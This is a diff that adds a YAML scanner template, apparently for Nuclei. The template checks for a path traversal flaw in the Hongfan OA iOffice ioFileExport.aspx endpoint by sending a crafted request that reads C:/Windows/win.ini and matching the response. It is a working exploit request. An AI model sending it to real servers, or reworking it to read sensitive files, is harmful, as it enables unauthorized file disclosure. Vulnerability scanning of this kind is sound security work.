@@ -1,0 +1,25 @@
+id: hongfan-ioffice-file-read
+
+info:
+  name: "红帆OA iOffice ioFileExport.aspx 文件路径遍历漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    红帆OA iOffice系统中的ioFileExport.aspx接口存在路径遍历漏洞，攻击者可通过构造恶意请求读取任意文件内容。该缺陷允许未经授权的用户访问受限系统文件，可能导致敏感数据泄露或系统权限突破。漏洞验证时间：2023-12-04
+  tags: 红帆
+
+http:
+- raw:
+  - |
+    GET /iOffice/prg/set/ioCom/ioFileExport.aspx?url=C:/Windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'fonts'
